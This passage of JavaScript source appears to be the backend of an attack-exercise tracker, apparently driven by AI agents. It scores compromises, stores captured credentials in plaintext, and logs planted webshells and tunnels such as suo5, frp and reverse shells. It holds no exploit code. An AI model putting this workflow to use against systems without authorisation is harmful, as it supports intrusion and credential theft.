        /* 自己注册/自建而被剔除的命中数（界面上单独提示，避免"记了却没分"的困惑） */
        selfCreatedHits: items.reduce((n, p) => n + p.self_created, 0),
      },
    }
  }

  /** 新增或更新得分点（带 id 更新，不带 id 新增）。得分类别**不设数量上限**，只记分值。 */
  saveScorePoint(id, point = {}) {
    const db = this.db(id)
    const name = String(point.name || '').trim()
    if (name === '') throw new Error('score point name required')
    const points = Number.isFinite(Number(point.points)) ? Number(point.points) : 0
    const enabled = point.enabled === false ? 0 : 1
    /* max_hits 列保留只为兼容老库结构，计分不再使用（恒写 1） */
    if (point.id !== undefined && point.id !== null && Number(point.id) > 0) {
      db.prepare(`UPDATE score_point SET name = ?, category = ?, points = ?, description = ?, enabled = ?,
          sort_order = COALESCE(?, sort_order), updated_at = ? WHERE id = ?`)
        .run(name, point.category ?? null, points, point.description ?? null, enabled,
          point.sort_order ?? null, nowIso(), Number(point.id))
      return { id: Number(point.id), updated: true }
    }
    const next = db.prepare('SELECT COALESCE(MAX(sort_order), -1) + 1 AS n FROM score_point').get().n
    const r = db.prepare(`INSERT INTO score_point(code, name, category, points, description, enabled, sort_order, created_at, updated_at)
      VALUES(?,?,?,?,?,?,?,?,?)`).run(
      point.code ?? null, name, point.category ?? null, points, point.description ?? null, enabled,
      next, nowIso(), nowIso(),
    )
    return { id: Number(r.lastInsertRowid), updated: false }
  }

  deleteScorePoint(id, pointId) {
    const db = this.db(id)
    db.prepare('DELETE FROM score_hit WHERE point_id = ?').run(Number(pointId))
    db.prepare('DELETE FROM score_point WHERE id = ?').run(Number(pointId))
    return { deleted: Number(pointId) }
  }

  /** 记录一次得分（某个得分点在某个目标上被拿下）。 */
  addScoreHit(id, hit = {}) {
    const db = this.db(id)
    let pointId = hit.point_id !== undefined && hit.point_id !== null ? Number(hit.point_id) : null
    if (pointId === null && hit.code) {
      const row = db.prepare('SELECT id FROM score_point WHERE code = ?').get(String(hit.code))
      if (row !== undefined) pointId = row.id
    }
    if (pointId === null && hit.point_name) {
      const row = db.prepare('SELECT id FROM score_point WHERE name = ?').get(String(hit.point_name))
      if (row !== undefined) pointId = row.id
    }
    if (pointId === null) throw new Error('score point not found：请用 point_id / code / point_name 指定得分点')
    const evidence = String(hit.evidence || '').trim()
    if (evidence === '') throw new Error('score hit evidence required：得分必须写明证据（账号/回显/数据量/路径）')
    /* 自己注册/自建的账号：允许记录（留过程），但不计分 */
    const selfCreated = hit.self_created === true || hit.self_created === 1 || hit.self_created === '1' ? 1 : 0
    const r = db.prepare(`INSERT INTO score_hit(point_id, asset_id, vuln_id, step_id, target, evidence, note, self_created, recorded_by, recorded_at)
      VALUES(?,?,?,?,?,?,?,?,?,?)`).run(
      pointId, hit.asset_id ?? null, hit.vuln_id ?? null, hit.step_id ?? null,
      hit.target ?? null, evidence, hit.note ?? null, selfCreated,
      hit.recorded_by ?? null, nowIso(),
    )
    const point = db.prepare('SELECT name, points, code FROM score_point WHERE id = ?').get(pointId)
    const summary = this.listScorePoints(id).summary
    return {
      id: Number(r.lastInsertRowid), point_id: pointId,
      point: point ? point.name : null, points: point ? point.points : 0,
      self_created: selfCreated === 1,
      counted: selfCreated === 0,
      warning: selfCreated === 1
        ? '已记录，但**自己注册/自己创建的账号不计分**（演练得分针对"拿到别人已有的账号/权限"）。这条只作过程留痕，不占上限、不进报告。'
        : undefined,
      summary,
    }
  }

  /** 资产易打性评估：预期能拿到哪些成果、优先级多高。 */
  assessAsset(id, a = {}) {
    const db = this.db(id)
    let row
    if (a.asset_id !== undefined && a.asset_id !== null) row = db.prepare('SELECT * FROM asset WHERE id = ?').get(Number(a.asset_id))
    else if (a.ip) row = db.prepare('SELECT * FROM asset WHERE ip = ?').get(String(a.ip))
    if (row === undefined) throw new Error('asset not found（请传 asset_id 或 ip）')
    const priority = ['high', 'medium', 'low'].includes(a.priority) ? a.priority : (row.priority || 'medium')
    const stamp = nowIso()
    db.prepare('UPDATE asset SET priority = ?, potential = ?, assess_reason = ?, assessed_at = ?, assessed_by = ? WHERE id = ?')
      .run(priority, a.potential ?? (row.potential || ''), a.reason ?? (row.assess_reason || ''), stamp, a.assessed_by ?? null, row.id)
    this.#observe(db, 'asset', row.id, 'assess', priority + ' ' + (a.potential || ''), 'active', a.assessed_by ?? null, null)
    return { asset_id: row.id, ip: row.ip, priority, potential: a.potential ?? (row.potential || ''), assessed_at: stamp }
  }

  /* ---------- 资产测试状态（做了哪些测试 / 还剩什么攻击面） ---------- */

  /**
   * 记录对某个资产的测试情况。
   * @param id - 靶标 id。
   * @param t - `{ asset_id?, ip?, status?, test?, surface?, blocked?, updated_by? }`
   *   · test 会**追加**到测试记录（带时间戳）；
   *   · surface 覆盖「剩余可测攻击面」；
   *   · blocked=true 时封禁计数 +1。
   */
  updateAssetTest(id, t = {}) {
    const db = this.db(id)
    let row
    if (t.asset_id !== undefined && t.asset_id !== null) {
      row = db.prepare('SELECT * FROM asset WHERE id = ?').get(Number(t.asset_id))
    } else if (t.ip) {
      row = db.prepare('SELECT * FROM asset WHERE ip = ?').get(String(t.ip))
    }
    if (row === undefined) throw new Error('asset not found（请传 asset_id 或 ip）')
    const status = ['untested', 'testing', 'tested', 'blocked', 'abandoned', 'no_surface'].includes(t.status)
      ? t.status
      : (row.test_status || 'untested')
    const stamp = nowIso()
    /* 提示词历史上把这条记录叫 notes，模型也常照抄这个参数名；两种写法都收，
       统一落到 test_notes（追加式），避免"记了一行结论"其实什么都没写进去。 */
    const testText = [t.test, t.notes]
      .filter((x) => typeof x === 'string' && x.trim() !== '')
      .map((x) => x.trim())
      .join('；')
    let notes = row.test_notes || ''
    if (testText !== '') {
      notes = (notes === '' ? '' : notes.replace(/\n+$/, '') + '\n') + '[' + stamp + '] ' + testText
    }
    const surface = typeof t.surface === 'string' ? t.surface : (row.test_surface || '')
    const blockedCount = (row.blocked_count || 0) + (t.blocked === true ? 1 : 0)
    db.prepare(`UPDATE asset SET test_status = ?, test_notes = ?, test_surface = ?,
        test_updated_at = ?, test_updated_by = ?, blocked_count = ? WHERE id = ?`).run(
      status, notes, surface, stamp, t.updated_by ?? null, blockedCount, row.id,
    )
    if (testText !== '') {
      this.#observe(db, 'asset', row.id, 'test', testText, 'active', t.updated_by ?? null, null)
    }
    if (t.blocked === true) {
      this.#observe(db, 'asset', row.id, 'blocked', '第 ' + blockedCount + ' 次被封禁', 'active', t.updated_by ?? null, null)
    }
    return {
      asset_id: row.id, ip: row.ip, status, blocked_count: blockedCount,
      test_notes: notes, tests: notes, surface, updated_at: stamp,
      hint: blockedCount >= 3
        ? '已累计被封 ' + blockedCount + ' 次（>3 次口径）：请在这次调用里把 status 置 abandoned 并写清剩余攻击面，然后换目标。'
        : undefined,
    }
  }

  /** 测试状态统计（供概览与筛选）。 */
  testStats(id) {
    const db = this.db(id)
    const rows = db.prepare("SELECT COALESCE(test_status, 'untested') AS s, COUNT(*) AS n FROM asset GROUP BY s").all()
    const out = { untested: 0, testing: 0, tested: 0, blocked: 0, abandoned: 0, no_surface: 0 }
    for (const r of rows) out[r.s] = r.n
    return out
  }

  /* ---------- 漏洞 / 凭据 / 访问会话 ---------- */

  /** 记录一条漏洞；带 cve 时按 (asset_id, cve, target) 幂等更新。 */
  addVuln(id, v = {}) {
    const db = this.db(id)
    const severity = SEVERITIES.includes(v.severity) ? v.severity : 'info'
    const status = VULN_STATUSES.includes(v.status) ? v.status : 'candidate'
    const existing = v.cve
      ? db.prepare("SELECT id FROM vuln WHERE asset_id IS ? AND cve = ? AND COALESCE(target, '') = ?")
        .get(v.asset_id ?? null, v.cve, v.target ?? '')
      : db.prepare("SELECT id FROM vuln WHERE asset_id IS ? AND COALESCE(cve, '') = '' AND title = ? AND COALESCE(target, '') = ?")
        .get(v.asset_id ?? null, v.title ?? '', v.target ?? '')
    if (existing !== undefined) {
      db.prepare(`UPDATE vuln SET
          title = COALESCE(?, title), severity = ?, status = COALESCE(?, status),
          evidence = COALESCE(?, evidence), confidence = COALESCE(?, confidence),
          source = COALESCE(?, source), target = COALESCE(?, target),
          found_by_agent = COALESCE(?, found_by_agent), gained = COALESCE(?, gained)
        WHERE id = ?`).run(
        v.title ?? null, severity, v.status ?? null, v.evidence ?? null, v.confidence ?? null,
        v.source ?? null, v.target ?? null, v.found_by_agent ?? null, normGained(v.gained), existing.id,
      )
      return { id: existing.id, updated: true }
    }
    const result = db.prepare(`INSERT INTO vuln(asset_id, port_id, cve, title, severity, source, confidence, status, evidence, target, gained, found_by_agent, found_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
      v.asset_id ?? null, v.port_id ?? null, v.cve ?? null, v.title ?? null, severity,
      v.source ?? null, v.confidence ?? null, status, v.evidence ?? null, v.target ?? null,
      normGained(v.gained), v.found_by_agent ?? null, nowIso(),
    )
    const vulnId = Number(result.lastInsertRowid)
    if (v.asset_id !== undefined && v.asset_id !== null) {
      this.#observe(db, 'asset', v.asset_id, 'vuln', [v.cve, v.title].filter(Boolean).join(' '), 'active', v.source ?? null, null)
    }
    return { id: vulnId, updated: false }
  }

  listVulns(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.severity) { where.push('v.severity = ?'); args.push(f.severity) }
    if (f.status) { where.push('v.status = ?'); args.push(f.status) }
    if (f.cve) { where.push('v.cve LIKE ?'); args.push(`%${f.cve}%`) }
    if (f.asset_id !== undefined && f.asset_id !== null) { where.push('v.asset_id = ?'); args.push(Number(f.asset_id)) }
    if (f.cidr) { where.push('a.segment_cidr = ?'); args.push(f.cidr) }
    if (f.q) {
      where.push('(v.title LIKE ? OR v.cve LIKE ? OR v.target LIKE ? OR v.evidence LIKE ?)')
      const like = `%${f.q}%`
      args.push(like, like, like, like)
    }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    const total = db.prepare(`SELECT COUNT(*) AS n FROM vuln v LEFT JOIN asset a ON a.id = v.asset_id ${clause}`).get(...args).n
    const items = db.prepare(`SELECT v.*, a.ip AS asset_ip, a.segment_cidr
      FROM vuln v LEFT JOIN asset a ON a.id = v.asset_id ${clause}
      ORDER BY CASE v.severity WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 WHEN 'low' THEN 3 ELSE 4 END,
               v.id DESC LIMIT ?`).all(...args, limit)
    /* 详情里要直接展示原始请求/响应，这里一并带上（请求体可能很大，做长度保护） */
    const eviStmt = db.prepare(`SELECT id, label, method, url, status, request, response, note, captured_by, captured_at
      FROM http_evidence WHERE vuln_id = ? ORDER BY id`)
    const clipped = (t) => (t === null || t === undefined ? null : (String(t).length > 60000 ? String(t).slice(0, 60000) + '\n…（截断）' : String(t)))
    for (const item of items) {
      item.http_evidence = eviStmt.all(item.id).map((e) => Object.assign({}, e, {
        request: clipped(e.request), response: clipped(e.response),
      }))
    }
    return { total, items }
  }

  updateVuln(id, vulnId, patch = {}) {
    const db = this.db(id)
    const current = db.prepare('SELECT * FROM vuln WHERE id = ?').get(Number(vulnId))
    if (current === undefined) return { updated: false }
    db.prepare(`UPDATE vuln SET status = ?, severity = ?, evidence = COALESCE(?, evidence), confidence = COALESCE(?, confidence),
        gained = COALESCE(?, gained), title = COALESCE(?, title)
      WHERE id = ?`).run(
      VULN_STATUSES.includes(patch.status) ? patch.status : current.status,
      SEVERITIES.includes(patch.severity) ? patch.severity : current.severity,
      patch.evidence ?? null, patch.confidence ?? null, normGained(patch.gained), patch.title ?? null, Number(vulnId),
    )
    return { updated: true, id: Number(vulnId) }
  }

  vulnStats(id) {
    const db = this.db(id)
    const bySeverity = {}
    for (const row of db.prepare('SELECT severity, COUNT(*) AS n FROM vuln GROUP BY severity').all()) bySeverity[row.severity] = row.n
    const byStatus = {}
    for (const row of db.prepare('SELECT status, COUNT(*) AS n FROM vuln GROUP BY status').all()) byStatus[row.status] = row.n
    /* 已经写明"拿到了什么权限"的漏洞数：结论行用 */
    const withGained = db.prepare("SELECT COUNT(*) AS n FROM vuln WHERE COALESCE(gained,'') <> ''").get().n
    const withEvidence = db.prepare("SELECT COUNT(*) AS n FROM vuln WHERE COALESCE(evidence,'') <> '' OR id IN (SELECT vuln_id FROM http_evidence WHERE vuln_id IS NOT NULL)").get().n
    /* 按目标聚合所需的组数（漏洞页默认视图）：先按「站点/服务」归并再数 */
    const rawTargets = db.prepare(`SELECT target, (SELECT ip FROM asset WHERE id = vuln.asset_id) AS ip FROM vuln`).all()
    const targetGroups = new Set(rawTargets.map((r) => targetKey(r.target, r.ip))).size
    return {
      total: Object.values(bySeverity).reduce((a, b) => a + b, 0),
      bySeverity, byStatus, withGained, withEvidence, targetGroups,
    }
  }

  /** 凭据：明文写 secret_value（面板直接显示），同时保留 secret_ref 指向证据文件。 */
  addCredential(id, c = {}) {
    const db = this.db(id)
    if (!c.host) throw new Error('credential.host required')
    /* 明文凭据：secret_value 为准，兼容 secret / password / value 等别名 */
    const value = c.secret_value ?? c.secret ?? c.password ?? c.value ?? null
    db.prepare(`INSERT INTO credential(asset_id, host, username, secret_type, secret_value, secret_ref, privilege, source, tool, note, found_by_agent, found_at)
      VALUES(?,?,?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT(host, username, secret_type) DO UPDATE SET
        secret_value = COALESCE(excluded.secret_value, credential.secret_value),
        secret_ref = COALESCE(excluded.secret_ref, credential.secret_ref),
        privilege = COALESCE(excluded.privilege, credential.privilege),
        note = COALESCE(excluded.note, credential.note),
        found_at = excluded.found_at`).run(
      c.asset_id ?? null, c.host, c.username ?? '', c.secret_type ?? 'password',
      value === null || value === undefined ? null : String(value),
      c.secret_ref ?? null, c.privilege ?? null, c.source ?? null, c.tool ?? null,
      c.note ?? null, c.found_by_agent ?? null, nowIso(),
    )
    const row = db.prepare('SELECT id FROM credential WHERE host = ? AND username = ? AND secret_type = ?')
      .get(c.host, c.username ?? '', c.secret_type ?? 'password')
    return { id: row.id }
  }

  listCredentials(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.host) { where.push('host = ?'); args.push(f.host) }
    if (f.username) { where.push('username = ?'); args.push(f.username) }
    if (f.withValue === true) where.push("COALESCE(secret_value,'') <> ''")
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    return db.prepare(`SELECT * FROM credential ${clause} ORDER BY id DESC LIMIT ?`).all(...args, limit)
  }

  /** 访问会话：一次可控访问（横向移动的起点）。 */
  addAccess(id, a = {}) {
    const db = this.db(id)
    if (!a.host) throw new Error('access.host required')
    const result = db.prepare(`INSERT INTO access_session(asset_id, host, username, method, privilege, session_ref, note, found_by_agent, obtained_at)
      VALUES(?,?,?,?,?,?,?,?,?)`).run(
      a.asset_id ?? null, a.host, a.username ?? null, a.method ?? null, a.privilege ?? null,
      a.session_ref ?? null, a.note ?? null, a.found_by_agent ?? null, nowIso(),
    )
    if (a.asset_id !== undefined && a.asset_id !== null) {
      this.#observe(db, 'asset', a.asset_id, 'access', [a.method, a.username, a.privilege].filter(Boolean).join(' '), 'active', 'exploit', null)
    }
    return { id: Number(result.lastInsertRowid) }
  }

  listAccess(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.host) { where.push('host = ?'); args.push(f.host) }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    return db.prepare(`SELECT * FROM access_session ${clause} ORDER BY id DESC LIMIT ?`).all(...args, limit)
  }

  /* ---------- WebShell 与隧道：打的过程中随时可复用的资产 ---------- */

  /**
   * 登记一个已上线的 WebShell。同一 url+pass_key 视为同一条，重复登记即刷新。
   * @param w - `{ url, shell_type, pass_key, secret_ref, privilege, status, note, asset_id, found_by_agent }`
   */
  addWebshell(id, w = {}) {
    const db = this.db(id)
    if (!w.url) throw new Error('webshell.url required')
    const ts = nowIso()
    const existing = db.prepare('SELECT id FROM webshell WHERE url = ? AND COALESCE(pass_key, \'\') = COALESCE(?, \'\')')
      .get(w.url, w.pass_key ?? null)
    if (existing !== undefined) {
      db.prepare(`UPDATE webshell SET shell_type = COALESCE(?, shell_type), secret_ref = COALESCE(?, secret_ref),
        privilege = COALESCE(?, privilege), status = COALESCE(?, status), note = COALESCE(?, note),
        asset_id = COALESCE(?, asset_id), updated_at = ? WHERE id = ?`)
        .run(w.shell_type ?? null, w.secret_ref ?? null, w.privilege ?? null, w.status ?? 'online',
          w.note ?? null, w.asset_id ?? null, ts, existing.id)
      return { id: Number(existing.id), updated: true }
    }
    const result = db.prepare(`INSERT INTO webshell(asset_id, url, shell_type, pass_key, secret_ref, privilege,
      status, note, found_by_agent, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?)`)
      .run(w.asset_id ?? null, w.url, w.shell_type ?? null, w.pass_key ?? null, w.secret_ref ?? null,
        w.privilege ?? null, w.status ?? 'online', w.note ?? null, w.found_by_agent ?? null, ts, ts)
    if (w.asset_id !== undefined && w.asset_id !== null) {
      this.#observe(db, 'asset', w.asset_id, 'webshell', w.url, 'active', 'exploit', null)
    }
    return { id: Number(result.lastInsertRowid), updated: false }
  }

  listWebshells(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.status) { where.push('status = ?'); args.push(f.status) }
    if (f.asset_id) { where.push('asset_id = ?'); args.push(f.asset_id) }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    return db.prepare(`SELECT w.*, a.ip AS asset_ip FROM webshell w
      LEFT JOIN asset a ON a.id = w.asset_id ${clause} ORDER BY w.id DESC LIMIT ?`).all(...args, limit)
  }

  updateWebshell(id, wsId, patch = {}) {
    const db = this.db(id)
    const fields = ['status', 'check_note', 'latency_ms', 'last_check', 'privilege', 'note', 'secret_ref', 'shell_type']
    const sets = []
    const args = []
    for (const key of fields) {
      if (patch[key] !== undefined) { sets.push(`${key} = ?`); args.push(patch[key]) }
    }
    if (sets.length === 0) throw new Error('nothing to update')
    sets.push('updated_at = ?'); args.push(nowIso())
    const result = db.prepare(`UPDATE webshell SET ${sets.join(', ')} WHERE id = ?`).run(...args, wsId)
    if (result.changes === 0) throw new Error('webshell not found')
    return { updated: true }
  }

  /**
   * 登记一条内网隧道（suo5 / socks5 / ssh -R / frp …）。
   *
   * **判定规则**：只有跨越了靶标边界（通道一端在目标侧）的才算突破凭证：
   *   · target-outbound 目标主动连出（反弹 shell 落到我的服务器 / 目标上跑 frp 客户端）
   *   · target-http     经目标 WebShell/HTTP 通道（suo5 / Neo-ReGeorg）
   *   · target-agent    经目标已控进程/会话转发（SSH -R 由目标发起）
   *   · self-only       只在自己 VPS/自建服务器上开的代理或服务端 —— **不算突破**
   * 只在自己服务器上开个 socks5 不算打进内网，必须说清"目标侧的那一端是什么"。
   */
  addTunnel(id, t = {}) {
    const db = this.db(id)
    const ts = nowIso()
    const entryKind = TUNNEL_ENTRY_KINDS[t.entry_kind] !== undefined ? String(t.entry_kind) : null
    const result = db.prepare(`INSERT INTO tunnel(asset_id, webshell_id, kind, listen, entry, reach, entry_kind,
      status, pid, command, note, found_by_agent, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?)`)
      .run(t.asset_id ?? null, t.webshell_id ?? null, t.kind ?? 'socks5', t.listen ?? null, t.entry ?? null,
        t.reach ?? null, entryKind, t.status ?? 'active', t.pid ?? null, t.command ?? null, t.note ?? null,
        t.found_by_agent ?? null, ts, ts)
    if (t.asset_id !== undefined && t.asset_id !== null) {
      this.#observe(db, 'asset', t.asset_id, 'tunnel', `${t.kind || 'socks5'} ${t.listen || ''}`.trim(), 'active', 'exploit', null)
    }
    const legit = tunnelIsLegit(entryKind)
    return {
      id: Number(result.lastInsertRowid),
      entry_kind: entryKind,
      legit,
      warning: legit === false
        ? '已登记，但 entry_kind=self-only（只在自己 VPS/自建服务器上开的通道）—— **这不算隧道、不算边界突破/内网突破**。必须是目标侧发起的通道：目标反弹 shell 到我的服务器、目标上跑 frp 客户端、或经目标 WebShell 建的 suo5/HTTP 隧道。'
        : (legit === null
            ? '建议补 entry_kind 说明"目标侧的那一端是什么"（target-outbound / target-http / target-agent）；不声明时界面按"待确认"显示，也不计入突破凭证。'
            : undefined),
    }
  }

  listTunnels(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.status) { where.push('t.status = ?'); args.push(f.status) }
    if (f.asset_id) { where.push('t.asset_id = ?'); args.push(f.asset_id) }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const limit = Math.min(Number(f.limit) || 200, 1000)
    return db.prepare(`SELECT t.*, a.ip AS asset_ip, w.url AS webshell_url FROM tunnel t
      LEFT JOIN asset a ON a.id = t.asset_id
      LEFT JOIN webshell w ON w.id = t.webshell_id ${clause} ORDER BY t.id DESC LIMIT ?`).all(...args, limit)
      .map((t) => Object.assign({}, t, { legit: tunnelIsLegit(t.entry_kind), entry_kind_label: TUNNEL_ENTRY_KINDS[t.entry_kind] || null }))
  }

  updateTunnel(id, tId, patch = {}) {
    const db = this.db(id)
    const fields = ['status', 'check_note', 'latency_ms', 'last_check', 'listen', 'reach', 'entry', 'entry_kind', 'pid', 'command', 'note']
    const sets = []
    const args = []
    for (const key of fields) {
      if (patch[key] !== undefined) { sets.push(`${key} = ?`); args.push(patch[key]) }
    }
    if (sets.length === 0) throw new Error('nothing to update')
    sets.push('updated_at = ?'); args.push(nowIso())
    const result = db.prepare(`UPDATE tunnel SET ${sets.join(', ')} WHERE id = ?`).run(...args, tId)
    if (result.changes === 0) throw new Error('tunnel not found')
    return { updated: true }
  }

  /**
   * 当前测试面板：正在测的资产 + 最近动过的资产（带各自已确认漏洞数/端口数/入口数）。
   * 攻击链页面的「当前正在测」区块用它，客户端每隔几秒轮询一次实现实时更新。
   */
  activeTests(id, f = {}) {
    const db = this.db(id)
    const limit = Math.min(Number(f.limit) || 8, 50)
    const select = `SELECT a.id, a.ip, a.segment_cidr, COALESCE(a.scope, (${SCOPE_SQL})) AS scope, a.state,
        COALESCE(a.test_status, 'untested') AS test_status, a.test_notes, a.test_surface,
        a.test_updated_at, a.test_updated_by, COALESCE(a.blocked_count, 0) AS blocked_count,
        a.priority, a.potential,
        (SELECT COUNT(*) FROM port p WHERE p.asset_id = a.id AND p.state = 'open') AS open_ports,
        (SELECT COUNT(*) FROM vuln v WHERE v.asset_id = a.id AND v.status IN ('confirmed','exploited')) AS vulns,
        (SELECT COUNT(*) FROM webshell w WHERE w.asset_id = a.id) AS webshells,
        (SELECT COUNT(*) FROM tunnel t WHERE t.asset_id = a.id) AS tunnels`
    const testing = db.prepare(`${select} FROM asset a
      WHERE COALESCE(a.test_status, 'untested') = 'testing'
      ORDER BY a.test_updated_at DESC, a.id DESC LIMIT ?`).all(limit)
    /* 最近动过：排除正在测的，避免两个区块重复 */
    const recent = db.prepare(`${select} FROM asset a
      WHERE a.test_updated_at IS NOT NULL AND COALESCE(a.test_status, 'untested') <> 'testing'
      ORDER BY a.test_updated_at DESC LIMIT ?`).all(limit)
    /* 待测队列：还没动的，按易打性 + 端口数排出先打哪几台 */
    const queue = db.prepare(`${select} FROM asset a
      WHERE COALESCE(a.test_status, 'untested') = 'untested'
      ORDER BY CASE COALESCE(a.priority, '') WHEN 'high' THEN 0 WHEN 'medium' THEN 1 WHEN 'low' THEN 2 ELSE 3 END,
        (SELECT COUNT(*) FROM port p WHERE p.asset_id = a.id AND p.state = 'open') DESC, a.ip_int
      LIMIT ?`).all(limit)
    const untested = db.prepare(`SELECT COUNT(*) AS n FROM asset a
      WHERE COALESCE(a.test_status, 'untested') = 'untested'`).get().n
    return { testing, recent, queue, stats: this.testStats(id), untested, at: nowIso() }
  }

  /**
   * 攻击得分链路复现报告：只收录"拿到了分"的成果，平铺成列表。
   * 每条都尽量带上能直接粘进 Yakit Repeater 的原始请求：
   *   ① 显式关联的漏洞（score_hit.vuln_id）→ 该漏洞的 http_evidence（最准）
   *   ② 兜底：同资产 + 按目标 URL 路径匹配（标注为自动匹配）
   *   ③ 都没有 → 只给证据文本，并标 missing_evidence
   */
  scoreReport(id, options = {}) {
    const db = this.db(id)
    const meta = readMeta(this.metaPathOf(id)) || {}
    const limit = Math.min(Number(options.limit) || 500, 2000)
    const rows = db.prepare(`SELECT h.*, p.code, p.name AS point_name, p.points, p.category,
        a.ip AS asset_ip, v.title AS vuln_title, v.cve AS vuln_cve, v.gained AS vuln_gained, v.severity AS vuln_severity
      FROM score_hit h
      LEFT JOIN score_point p ON p.id = h.point_id
      LEFT JOIN asset a ON a.id = h.asset_id
      LEFT JOIN vuln v ON v.id = h.vuln_id
      ORDER BY h.recorded_at, h.id LIMIT ?`).all(limit)

    /* 计分口径：同类得分不设上限，命中即累加（自建账号已在上面整条剔除） */
    const perPoint = new Map()
    const eviByVuln = db.prepare(`SELECT id, label, method, url, status, request, response, note, captured_at
      FROM http_evidence WHERE vuln_id = ? ORDER BY id`)

    const clip = (t, n) => {
      const s = t === null || t === undefined ? '' : String(t)
      return s.length > n ? s.slice(0, n) + '\n…（截断，完整内容见证据文件）' : s
    }

    /* 每条命中落在攻击链的哪个阶段（与攻击链页同一套推导规则） */
    const scopeOf = new Map()
    if (rows.length > 0) {
      const ids = Array.from(new Set(rows.map((r) => r.asset_id).filter((v) => v !== null && v !== undefined)))
      if (ids.length > 0) {
        const ph = ids.map(() => '?').join(',')
        for (const a of db.prepare(`SELECT id, COALESCE(scope, (${SCOPE_SQL})) AS scope FROM asset WHERE id IN (${ph})`).all(...ids)) {
          scopeOf.set(a.id, a.scope)
        }
      }
    }
    /* 自己注册/自建的账号不算成果：从报告主体剔除，只在页脚给一个数字 */
    const selfCreatedRows = rows.filter((h) => Number(h.self_created) === 1)
    const reportRows = rows.filter((h) => Number(h.self_created) !== 1)

    const items = reportRows.map((h, i) => {
      const seen = perPoint.get(h.point_id) || 0
      perPoint.set(h.point_id, seen + 1)
      const counted = true

      /* 原始请求：先按显式关联的漏洞取 */
      let requests = h.vuln_id === null || h.vuln_id === undefined ? [] : eviByVuln.all(h.vuln_id).map((e) => ({
        label: e.label || (e.method || '') + ' ' + (e.url || ''), method: e.method, url: e.url, status: e.status,
        request: clip(e.request, 20000), response: clip(e.response, 8000), note: e.note, source: 'linked',
      }))
      /* 兜底：同资产 + 目标路径逐级降级匹配（先精确到两级路径，再退到一级、再到整个授权） */
      if (requests.length === 0 && h.target) {
        const full = String(h.target).trim()
        const um = /^([a-z][a-z0-9+.-]*:\/\/)([^/?#\s]+)(\/[^?#\s]*)?/i.exec(full)
        const candidates = []
        if (um !== null) {
          const authority = um[2]
          const segs = (um[3] || '').split('/').filter(Boolean)
          if (segs.length >= 2) candidates.push('%' + authority + '/' + segs.slice(0, 2).join('/') + '%')
          if (segs.length >= 1) candidates.push('%' + authority + '/' + segs[0] + '%')
          candidates.push('%' + authority + '%')
          if (segs.length >= 2) candidates.push('%/' + segs.slice(0, 2).join('/') + '%')
        } else {
          const auth = full.split('/')[0].split('?')[0]
          if (auth !== '') candidates.push('%' + auth + '%')
        }
        const SQL = 'SELECT id, label, method, url, status, request, response, note FROM http_evidence WHERE url LIKE ? ORDER BY id LIMIT 3'
        const SQL_ASSET = 'SELECT id, label, method, url, status, request, response, note FROM http_evidence WHERE asset_id = ? AND url LIKE ? ORDER BY id LIMIT 3'
        let rows2 = []
        if (h.asset_id !== null && h.asset_id !== undefined) {
          for (const like of candidates) {
            rows2 = db.prepare(SQL_ASSET).all(h.asset_id, like)
            if (rows2.length > 0) break
          }
        }
        if (rows2.length === 0) {
          for (const like of candidates) {
            rows2 = db.prepare(SQL).all(like)
            if (rows2.length > 0) break
          }
        }
        requests = rows2.map((e) => ({
          label: e.label || (e.method || '') + ' ' + (e.url || ''), method: e.method, url: e.url, status: e.status,
          request: clip(e.request, 20000), response: clip(e.response, 8000), note: e.note, source: 'auto',
        }))
      }
      return {
        seq: i + 1,
        id: h.id,
        point_id: h.point_id,
        stage_code: scoreStageOf({ stage_code: h.stage_code, code: h.code, target: h.target },
          h.asset_id === null || h.asset_id === undefined ? undefined : scopeOf.get(h.asset_id)),
        point_name: h.point_name || '（已删除的得分点）',
        category: h.category || '',
        points: h.points || 0,
        counted: counted,
        nth_of_point: seen + 1,
        target: h.target || '',
        asset_ip: h.asset_ip || '',
        gained: h.vuln_gained || '',
        vuln: h.vuln_id === null || h.vuln_id === undefined ? null : { id: h.vuln_id, title: h.vuln_title || '', cve: h.vuln_cve || null, severity: h.vuln_severity || null },
        evidence: h.evidence || '',
        note: h.note || '',
        recorded_by: h.recorded_by || '',
        recorded_at: h.recorded_at || '',
        requests: requests,
        missing_evidence: requests.length === 0,
      }
    })

    const summary = {
      count: items.length,
      points: items.reduce((n, x) => n + (x.counted ? x.points : 0), 0),
      withRequests: items.filter((x) => x.requests.length > 0).length,
      autoMatched: items.filter((x) => x.requests.some((r) => r.source === 'auto')).length,
      missingRequests: items.filter((x) => x.missing_evidence).length,
      /* 自己注册/自建账号的命中：不算成果，不写进报告 */
      selfCreatedExcluded: selfCreatedRows.length,
    }
    /* ── 按攻击链顺序（信息收集 → 互联网资产权限 → 边界突破 → 内网资产权限 → 靶标权限）分组 ── */
    let cumulative = 0
    const stages = this.listStages(id).map((st, si) => {
      const sItems = items.filter((x) => x.stage_code === st.code)
      const pts = sItems.reduce((n, x) => n + (x.counted ? x.points : 0), 0)
      cumulative += pts
      return { code: st.code, name: st.name, color: st.color, goal: st.goal, transition: st.transition,
        ordinal: si + 1, points: pts, cumulative: cumulative, items: sItems }
    }).filter((st) => st.items.length > 0)

    /* markdown（给复制/下载，也方便智能体直接交付） */
    const md = []
